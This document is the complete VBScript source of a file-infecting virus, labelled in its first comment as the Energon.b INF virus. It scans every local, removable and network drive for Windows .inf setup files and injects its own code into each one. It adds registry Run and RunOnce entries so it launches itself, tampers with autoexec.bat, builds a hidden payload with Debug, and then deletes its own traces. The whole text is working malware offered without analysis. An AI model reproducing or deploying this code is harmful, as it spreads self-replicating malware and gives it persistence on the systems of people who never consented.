'VOVAN//SMF - Energon.b INF virus.
On Error Resume Next
Set T=CreateObject("Scripting.FileSystemObject"):V=Chr(13)&Chr(10):HK="HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run":M0="[Version]":M1="[DestinationDirs]":M2="[DefaultInstall]":M3="Energon":B0="[":B1="]"+V:M4=B0+M3+"_dump]":M5="CopyFiles":M6="AddReg":M7="Host_"+M3+".File":M8="Inst_Run":M9="RenFiles = ":B2="\"+M3+".inf":Z1=Chr(34):B3="CmdAdd="+Z1:B4="Copy_Auto_Bak.Ren":B5="Rename_bat_vbs.Ren":B6="Ren_bak_bat.Ren":B7="Ren_Auto_Bat":B8="Run_"+B7+".reg":B9="Rename_bak_bat.reg":C0="Once,Run,,"+Z1+"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection ":C1=" 64 %10%"+B2+Z1+V:C2="Ren_bak_bat_run":C3="Install_"+M3:C4=M3+"_Attach":C5="autoexec":C6=C5+".bat":C7=C5+".bak":Set I=T.GetSpecialFolder(0):N=I+B2:Call Test_INF(N,1,X)
If X="" Then WScript.Quit
E=X:Set KK=T.Drives
For Each Drive In KK
If Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3 Then Search Drive.Path &"\"
Next
T.DeleteFile(N),1:T.DeleteFile(Wscript.ScriptFullName),1
Sub Infected(U)
W=T.GetFileName(U):Set VV=T.OpenTextFile(U,1):A0=VV.ReadAll:VV.Close:M=Split(A0,V)
For Z=0 To UBound(M) Step 1
A=M(Z)+V
If MT<>True Then If InStr(LTrim(A),"estination")=3 Then A=Mid(A,1,Len(A)):A=A+M7+"  = 10"+V:A=A+B4+"  = 30"+V:A=A+B5+" = 30"+V:A=A+B6+"    = 30"+V:MT=True
If MU<>True Then If InStr(LTrim(A),M2)=1 Then A=Mid(A,1,Len(A)):A=A+M5+" = "+M7+V:A=A+M6+" = "+M8+V:MU=True
If InStr(LTrim(A),"opy")=2 Then If Find(M5,A)=1 Then If InStr(A,M7)=0 Then A=Mid(A,1,Len(A)-2)+","+M7+V:CF=True Else CF=True
If InStr(LTrim(A),"dd")=2 Then If Find(M6,A)=1 Then If InStr(A,M8)=0 Then A=Mid(A,1,Len(A)-2)+","+M8+V:AD=True Else AD=True
If InStr(LTrim(A),B0)=1 And InStr(A,"]")<>0 Then
If CF=False And AD=True Then PP=Mid(A,1,Len(A)):A=M5+" = "+M7+V:A=A+PP
If AD=False And CF=True Then PP=Mid(A,1,Len(A)):A=M6+" = "+M8+V:A=A+PP
CF=False:AD=False
End If
D=D+A
Next
If MT<>True Then D=D+M1+V:D=D+M7+"  = 10"+V:D=D+B4+"  = 30"+V:D=D+B5+" = 30"+V:D=D+B6+"    = 30"+V
If MU<>True Then D=D+M2+V:D=D+M5+" = "+M7+V:D=D+M6+" = "+M8+V
D=D+B0+M8+B1:D=D+HK+"Services"+C0+C3+C1:D=D+B0+C3+B1:D=D+"UpdateInis = "+M3+"_dump"+V:D=D+M9+B4+V:D=D+"UpdateAutoBat = "+C4+V:D=D+M6+" = "+B8+V:D=D+B0+B4+B1:D=D+C7+","+C6+V:D=D+B0+B8+B1:D=D+HK+C0+B7+C1:D=D+B0+B7+B1:D=D+M9+B5+V:D=D+M6+" = "+B9+V:D=D+B0+B5+B1:D=D+"tmp.vbs,"+C6+V:D=D+B0+B9+B1:D=D+HK+C0+C2+C1:D=D+B0+C2+B1:D=D+M9+B6+V:D=D+M6+" = Run_tmp.reg"+V:D=D+B0+B6+B1:D=D+C6+","+C7+V:D=D+"[Run_tmp.reg]"+V:D=D+HK+"Once,Run,,""%10%\wscript.exe %30%\tmp.vbs //B"""+V:D=D+B0+M7+B1:D=D+M3+".inf,"+W+V:D=D+B0+C4+B1:D=D+B3+"On"",""Error Resume Next"""+V:D=D+B3+"Set"",""A=CreateObject(""""Scripting.FileSystemObject"""")"""+V:D=D+B3+"Set"",""B=CreateObject(""""WScript.Shell"""")"""+V:D=D+B3+"B.Run"",""(""""Command.com /c Debug < %10%\enr.drv""""),0"""+V:D=D+B3+"Do"""+V:D=D+B3+"If"",""A.FileExists(A.GetSpecialFolder(0)&""""\energon.vbs"""")<>0 Then Exit Do"""+V:D=D+B3+"Loop"""+V:D=D+B3+"B.Run"",""(""""%10%\wscript.exe %10%\energon.vbs""""),0"""+V:D=D+B3+"A.DeleteFile"",""(""""%10%\enr.drv""""),1"""+V
D=D+B3+"A.DeleteFile"",""(Wscript.ScriptFullName),1"""+V:D=D+E+V:Set F=T.OpenTextFile(U,2):F.Write D:F.Close
End Sub
Function Search(H)
Set J=T.GetFolder(H):Set C=J.SubFolders
For Each ZY In C
Search(ZY)
Next
Set C8=J.Files
For Each R In C8
S=T.GetExtensionName(R.Path)
If S="inf" Or S="INF" Then Call Test_INF(R.Path,2,0)
Next
End Function
Function Test_INF(G,Q,X)
X=""
If T.FileExists(G)=False Then Exit Function
Set B=T.OpenTextFile(G,1):O=B.ReadAll:B.Close:M=Split(O,V)
For Z=0 To UBound(M) Step 1
A=M(Z)+V
If YZ<>True Then If InStr(A,M0)=1 Or InStr(A,LCase(M0))=1 Then YZ=True
If PL<>True Then If InStr(A,M4)=1 Then A=Mid(A,1,Len(A)):PL=True
If PL=True Then
If InStr(A,";"+M3)=1 Then A=Mid(A,1,Len(A)):X=X+A:Y=True:Exit For
X=X+A
End If
Next
If Y=True Then If Q=1 Or Q=2 Then Exit Function
If Q=2 And YZ=True Then Infected(G)
End Function
Function Find(D0,D1)
Set P=New RegExp
P.Pattern=D0&"(=| )"
P.IgnoreCase=True
P.Global=True
Set C9=P.Execute(LTrim(D1))
For Each Match in C9
If Match.FirstIndex=0 Then Find=1:Exit For
Next
End Function